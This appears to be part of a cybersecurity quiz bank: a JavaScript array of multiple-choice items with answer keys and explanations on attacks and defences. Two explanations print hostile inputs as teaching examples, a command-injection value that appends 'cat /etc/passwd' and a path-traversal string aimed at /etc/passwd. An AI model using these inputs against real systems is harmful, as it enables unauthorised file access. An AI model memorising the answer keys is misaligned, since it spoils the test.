  {id:734,domain:P,question:"What is a sensitive data type requiring special handling?",options:["PII, PHI, PCI, and classified data","HR records visible only to managers","Data requiring multi-factor authentication","Any and all data an organization holds"],answer:0,explanation:"The combination of SSN + name + birthdate is sufficient for identity theft; credit card data enables fraud; medical records enable discrimination — sensitivity determines protection requirements.",optionExplanations:["Sensitive data is defined by the harm exposure would cause, like identity theft or fraud.","Manager-only access is a control decision, not a definition of sensitivity.","Auth requirements follow from sensitivity classification, not the other way around.","Not all organizational data is equally sensitive or harmful if exposed."]},
  {id:735,domain:G,question:"What is a side-channel attack's distinction from cryptanalysis?",options:["Both purely mathematical attacks","Side-channel always needs physical access","Just a faster form of cryptanalysis","Exploits leaked physical signals"],answer:3,explanation:"AES is mathematically secure against cryptanalysis; but an AES implementation leaking different power patterns for 0 vs. 1 key bits enables differential power analysis (DPA) attacks — defeating the implementation, not the algorithm.",optionExplanations:["Side-channel attacks are physical measurement attacks, not purely mathematical ones.","Side-channel attacks can be remote too, such as network timing attacks.","Speed isn't the distinction; the type of exploited information differs.","Side-channel attacks extract secrets from power, timing, or electromagnetic signals rather than math flaws."]},
  {id:736,domain:T,question:"What is ARP poisoning (ARP spoofing)?",options:["Modifying a remote core router's ARP table","Forged ARP replies with a false MAC","Chemical damage to cable insulation","DDoS against central ARP servers"],answer:1,explanation:"ARP poisoning: attacker sends 'IP 192.168.1.1 is at MAC aa:bb:cc:dd:ee:ff' (attacker's MAC), machines update their ARP cache, and traffic meant for the router goes through the attacker first.",optionExplanations:["ARP poisoning works within the local broadcast domain, not on distant routers.","Forged ARP replies let an attacker insert themselves into the local traffic path.","Cable sabotage is physical damage, not a protocol-spoofing attack.","ARP has no centralized servers to attack in the first place."]},
  {id:737,domain:A,question:"What is a security control's residual risk?",options:["Risk fully transferred to insurance","Risk remaining after controls are applied, requiring further decision","Risk inherent and eliminated by controls","Ongoing cost of maintaining controls"],answer:1,explanation:"No control eliminates risk entirely — a firewall reduces network attack risk but doesn't eliminate it; the remaining probability of a successful attack through other means is residual risk.",optionExplanations:["Insurance transfers financial impact but doesn't eliminate the remaining exposure.","Residual risk is the gap between total risk and what controls have reduced.","Controls reduce but rarely eliminate all risk entirely.","Control cost is a budgeting figure, not a measure of remaining risk."]},
  {id:738,domain:O,question:"What is a managed security service provider (MSSP)?",options:["Contract physical security guard staffing","Outsourced 24/7 security monitoring","Certification exam-prep consultancy","Security budget forecasting consultancy"],answer:1,explanation:"MSSPs (CrowdStrike Services, Trustwave, eSentire) offer 24/7 SOC-as-a-Service — particularly valuable for organizations that can't staff or afford their own security operations center.",optionExplanations:["Physical guard staffing handles building security, not cybersecurity monitoring.","MSSPs provide outsourced SOC services, threat intelligence, and incident response.","Exam-prep consultancies focus on training, not operational monitoring services.","Budget forecasting is financial planning, not hands-on security operations."]},
  {id:739,domain:T,question:"What is an OS command injection vulnerability?",options:["DoS against a vendor's own data centers","Malicious code in signed update packages","Executing unsanitized shell input","Routine scheduled patch deployment"],answer:2,explanation:"PHP: system('ping ' . $_GET['host']) — attacker inputs '127.0.0.1; cat /etc/passwd' and gets the password file back — OS command injection achieves full server compromise.",optionExplanations:["Attacking a vendor's data centers is an availability attack, not an app flaw.","Tampering with signed updates is a supply-chain attack, not command injection.","Command injection appends shell operators to unsanitized input, executing attacker commands.","Routine patch deployment is legitimate maintenance, not an exploited vulnerability."]},
  {id:740,domain:G,question:"What is a secure random number generator's importance in TLS?",options:["Ensures session IDs merely look unique","Randomness generated once at issuance only","TLS never uses randomness at all","Weak randomness enables key prediction"],answer:3,explanation:"TLS client_random and server_random must be unpredictable — if they're predictable (as in the Debian OpenSSL bug), the master secret and all derived session keys become predictable and the session can be decrypted.",optionExplanations:["Visual uniqueness isn't the goal; cryptographic unpredictability is what matters.","TLS requires fresh randomness for every individual session, not just at issuance.","TLS relies heavily on randomness throughout the handshake process.","Weak randomness in client/server random values can make session keys predictable and decryptable."]},
  {id:741,domain:T,question:"What is Kerberoasting?",options:["Physical damage to Kerberos network cabling","Cracking offline TGS tickets to recover service passwords","DoS flooding domain controllers","Crashing the KDC with malformed requests"],answer:1,explanation:"Any authenticated domain user can request a TGS for any SPN-registered service account, then crack it offline with hashcat — service accounts often have weak, never-changed passwords, making this a favorite post-compromise technique.",optionExplanations:["Physical cable or hardware damage is unrelated to this credential-theft technique.","TGS tickets are encrypted with the service account's password hash, enabling offline cracking.","Kerberoasting doesn't disrupt domain controller availability at all.","Kerberoasting quietly abuses legitimate ticket requests without crashing the KDC."]},
  {id:742,domain:A,question:"What is an Extended Validation (EV) certificate?",options:["Just a longer validity period","Rigorous identity verification","A backup reserve certificate","Covers many additional subdomains"],answer:1,explanation:"EV certificates require CAs to verify legal existence, physical address, and operational status of the organization — though browser UI no longer prominently displays EV status as it once did (green bar), reducing its practical user-facing value.",optionExplanations:["Expiration length is unrelated to validation rigor; EV is about identity checks.","EV requires the CA to verify legal existence, address, and operational status.","Backup certificates aren't a standard concept tied to EV validation.","Multi-domain coverage describes SAN/wildcard certificates, a separate feature."]},
  {id:743,domain:O,question:"What is log correlation in a SIEM?",options:["Deleting duplicate log entries","Compressing archived logs for storage","Centralizing all logs in one repository","Linking events across sources"],answer:3,explanation:"Example: failed VPN login (firewall log) + new admin account created (AD log) + large file transfer (DLP log) from the same IP within 10 minutes — correlation rules link these into a single high-priority alert representing a likely compromise.",optionExplanations:["Deduplication reduces noise but doesn't link distinct meaningful events together.","Archive compression saves space, with no analytical detection purpose.","Centralized storage is aggregation, a prerequisite step before correlation.","Correlation rules link related events across sources to reveal multi-stage attacks."]},
  {id:744,domain:T,question:"What is a Local File Inclusion (LFI) vulnerability?",options:["Including local files via bad paths","Backup policy accidentally excluding files","SMB/NFS share misconfiguration","Any local user reading any file"],answer:0,explanation:"Example: include($_GET['page'] . '.php') allows ?page=../../../etc/passwd%00 (with null byte bypass) to read sensitive files, or combined with log poisoning to achieve remote code execution.",optionExplanations:["LFI lets attackers manipulate file paths to read sensitive files or execute code.","Backup exclusion is a data-protection policy issue, unrelated to LFI.","LFI targets an app's own file-inclusion logic, not network file-share protocols.","LFI is exploited remotely via crafted requests, not local file permissions."]},
  {id:745,domain:G,question:"What is password entropy?",options:["Scheduled forced password-change rate","Raw count of characters used","Physical effort to type a password","Bit measure of randomness resisting guessing and brute force"],answer:3,explanation:"Entropy = log2(possible combinations) — a random 12-character password from a 95-character set has ~79 bits of entropy, while 'Password123!' has much lower effective entropy despite meeting complexity rules, because it follows predictable patterns.",optionExplanations:["Password expiration rate is an aging policy, unrelated to entropy.","Character count contributes to entropy but isn't the same as it.","Entropy is an information-theory concept, not physical typing effort.","Entropy measures randomness in bits, indicating resistance to guessing attacks."]},
  {id:746,domain:P,question:"What is a cookie consent mechanism required for under privacy regulations like GDPR?",options:["Browser encrypting all cookie contents","A bakery recipe technique","Explicit opt-in for tracking cookies","Permanently disabling all cookies by default"],answer:2,explanation:"GDPR and ePrivacy Directive require granular consent (not just an 'I agree' banner) — users must be able to accept/reject categories of cookies separately, and consent must be as easy to withdraw as to give.",optionExplanations:["Consent mechanisms are about permission, not automatically encrypting cookie contents.","This is unrelated wordplay about baked goods, not web privacy law.","GDPR requires clear opt-in consent for non-essential tracking and analytics cookies.","Essential cookies remain enabled; the rule targets tracking and marketing cookies specifically."]},
  {id:747,domain:A,question:"What is the purpose of a Virtual LAN (VLAN)?",options:["Extending maximum cable length","Converting wired networks to wireless","A simulated virtual-reality network experience","Segmenting a network into broadcast domains"],answer:3,explanation:"VLANs (802.1Q tagged) let one physical switch infrastructure support separate logical networks — finance traffic stays isolated from guest WiFi traffic even though they may traverse the same physical switches, requiring a router/L3 switch to communicate between VLANs.",optionExplanations:["VLANs don't affect physical cable length limits, a Layer 1 concern.","VLANs are a logical construct on existing wired hardware, not wireless conversion.","VLAN stands for Virtual Local Area Network, unrelated to VR experiences.","VLANs create isolated broadcast domains on shared physical switch hardware."]},
  {id:748,domain:O,question:"What are 'rules of engagement' in a penetration test?",options:["Hiring criteria for new consultants","Marketing guidelines for advertising services","A universal legal code for all practitioners","Scope, timing, and limits before testing"],answer:3,explanation:"RoE specifies what's in/out of scope (specific IPs, systems excluded), testing windows (avoid business hours for critical systems), permitted techniques (social engineering allowed? DoS testing allowed?), and emergency stop procedures — without RoE, testers could face legal liability or cause unintended outages.",optionExplanations:["Hiring criteria are a separate recruitment process, distinct from RoE.","RoE isn't about marketing; it's a scoping document for an active engagement.","RoE is specific to each engagement, not one universal legal framework.","RoE documents authorized scope, timing, and techniques agreed before testing begins."]},
  {id:749,domain:T,question:"What is a Golden Ticket attack?",options:["Attack on physical badge readers","A conference raffle prize trophy","Forging TGTs using the compromised KRBTGT hash for persistent access","A legitimate VIP conference pass"],answer:2,explanation:"With the KRBTGT hash, attackers can forge TGTs valid for any user (including ones that don't exist) with any group membership, for up to 10 years by default — making Golden Tickets one of the most severe Active Directory persistence mechanisms, requiring KRBTGT password reset (twice) to remediate.",optionExplanations:["Physical badge attacks target building access, unrelated to Kerberos infrastructure.","A raffle prize is an event giveaway, not a domain-compromise technique.","With the KRBTGT hash, attackers forge TGTs to persistently impersonate any user.","A VIP pass is a legitimate credential, not the malicious ticket this attack forges."]},
  {id:750,domain:G,question:"What is the difference between symmetric and asymmetric cryptographic key exchange in TLS?",options:["Establishes a session key without presharing","Asymmetric is always faster than symmetric","Symmetric exchange authenticates the server only","Just two marketing names for one mechanism"],answer:0,explanation:"TLS uses asymmetric cryptography (RSA or ECDHE) during the handshake to securely establish a shared symmetric session key, then switches to fast symmetric encryption (AES) for the actual data — combining asymmetric's secure key establishment with symmetric's performance.",optionExplanations:["Asymmetric methods like Diffie-Hellman establish a unique session key without needing a pre-shared secret.","Symmetric encryption is actually faster for bulk data than asymmetric operations.","Symmetric algorithms encrypt data; server authentication instead uses asymmetric signatures.","These are fundamentally different mechanisms with distinct security properties."]},
  {id:751,domain:O,question:"What is a chain of custody in digital forensics?",options:["Sequence of routine patch applications","IR team's internal reporting hierarchy","Documented, unbroken evidence record","A physical chain and padlock on evidence storage"],answer:2,explanation:"Chain of custody documentation (timestamps, signatures, hash values at each transfer) proves evidence wasn't tampered with — a broken chain of custody can get digital evidence thrown out of court even if the evidence itself clearly shows wrongdoing.",optionExplanations:["Patch sequencing is routine IT maintenance, unrelated to evidence handling.","Reporting hierarchy is an org structure, distinct from evidence documentation.","Chain of custody documents who handled evidence and when, ensuring its integrity.","A physical lock secures a room; it isn't the documentation trail itself."]},
  {id:752,domain:A,question:"What is the purpose of certificate pinning?",options:["Pinning a printed certificate to a corkboard","Hardcoding the expected certificate or key","Entering a PIN to unlock a certificate","Setting a fixed, non-renewable expiration date"],answer:1,explanation:"Mobile banking apps often pin their server's certificate — even if an attacker obtains a fraudulent cert from a compromised CA and performs a MITM attack, the app rejects the connection because the certificate doesn't match the pinned value.",optionExplanations:["This describes a physical bulletin-board action, not a technical security control.","Pinning hardcodes the expected certificate or key so a fraudulent CA cert is rejected.","Pinning is embedded in app code, not a PIN-based user authentication step.","Expiration management is a separate lifecycle concern from which certificate is trusted."]},
  {id:753,domain:T,question:"What is a watering hole attack?",options:["A water-themed phishing email campaign","Physical sabotage of a water treatment plant","Compromising a site the target group frequently visits to deliver malware","Exfiltrating an entire production database"],answer:2,explanation:"APT groups research which industry forums, trade association sites, or news sites their target organization's employees frequently visit, then compromise that third-party site to deliver malware — bypassing the target's own perimeter defenses by exploiting trust in a site they already visit.",optionExplanations:["The name is a metaphor, unrelated to water-themed phishing content.","This isn't physical infrastructure sabotage; it's a malware delivery technique.","Attackers compromise a trusted, frequently visited site to infect its usual visitors.","This isn't bulk data exfiltration; it's malware delivery via a compromised site."]},
  {id:754,domain:G,question:"What is the principle of non-repudiation in cybersecurity?",options:["Avoiding repeating the same policy point","A legal right to deny an accusation","Locking accounts after failed login attempts","Proof of origin via digital signatures"],answer:3,explanation:"Digital signatures provide non-repudiation because only the holder of the private key could have created that signature — combined with audit logs and timestamps, this prevents a user from credibly denying they performed a transaction or sent a communication.",optionExplanations:["This is unrelated to meeting conduct; it concerns provable accountability for actions.","Non-repudiation is the opposite; it prevents successful denial through cryptographic proof.","Account lockout addresses brute force, a distinct control unrelated to non-repudiation.","Digital signatures prove origin, preventing a party from credibly denying an action."]},
  {id:755,domain:O,question:"What is a tabletop exercise in incident response planning?",options:["A casual board game at lunch","A hands-on live-fire lab exercise","Conference seating and catering logistics","Discussion-based response walkthrough"],answer:3,explanation:"Tabletop exercises (e.g., 'a ransomware attack has encrypted the file server — what do you do?') let teams identify gaps in IR plans, unclear roles, and communication breakdowns in a low-stakes setting before a real incident tests the plan under pressure.",optionExplanations:["This is a serious training exercise, not a casual recreational game.","Tabletops are discussion-based, requiring no physical lab equipment.","This is unrelated event logistics, not an IR training methodology.","Tabletop exercises let teams discuss and test their response roles without technical action."]},
  {id:756,domain:T,question:"What is a buffer overflow vulnerability?",options:["Network link congestion from excess traffic","A cloud storage quota misconfiguration","Overwriting memory to run code","A database schema row-limit flaw"],answer:2,explanation:"Classic buffer overflows overwrite the return address on the stack with attacker-controlled data, redirecting execution to injected shellcode — modern mitigations like ASLR, DEP/NX, and stack canaries make exploitation harder but don't eliminate the vulnerability class.",optionExplanations:["Network congestion is unrelated to memory corruption vulnerabilities.","Storage quota issues cause upload errors, not memory overwrites.","Writing past a buffer's bounds can overwrite memory and enable arbitrary code execution.","Database constraint violations are unrelated to low-level memory corruption."]},
];
